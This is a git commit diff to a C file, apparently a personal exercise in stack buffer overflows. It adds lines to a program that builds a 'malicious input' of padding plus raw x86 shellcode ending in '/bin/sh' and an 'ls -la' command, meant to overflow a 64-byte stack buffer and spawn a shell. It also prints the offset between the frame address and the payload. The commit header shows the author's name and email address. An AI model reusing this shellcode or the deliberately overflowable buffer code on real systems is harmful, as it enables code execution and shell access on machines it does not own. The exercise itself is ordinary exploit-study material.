a94327aa88b9ceaf49f1fe511dcc3d03d228e840
cal <callum.adair@outlook.com>
2023-05-02 14:13:08 +0100

    Some properish overflowing

--- overflow.c
+++ overflow.c
@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <string.h>
+#include <stdint.h>
+#include <stdlib.h>
 
 void overflow(char *input_str) {
 	char buff[64];
@@ -9,7 +11,7 @@ void overflow(char *input_str) {
 
 int main(char* argv[], int argc) {
 	//our malicious input will look something like this, containing 56 bad chars, so we need 8 padding chars.
-	char rand_str[] = "aaaabbbb"	
+	char rand_str[] = "aaaabbb"	
 	"\xeb\x24\x5e\x89\x74\x24\x08\x31"
 	"\xc0\x88\x44\x24\x07\x89\x44\x24"
 	"\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
@@ -18,6 +20,9 @@ int main(char* argv[], int argc) {
 	"\xff\xff\xff"
 	"/bin/sh"
 	"\x6c\x73\x20\x2d\x6c\x61";
+
+	 uintptr_t diff = (uintptr_t) __builtin_frame_address(0) - (uintptr_t) rand_str;
+	 printf("%p\n", (uintptr_t) diff);
 	
 	// char rand_str[64];
 	// gets(rand_str);
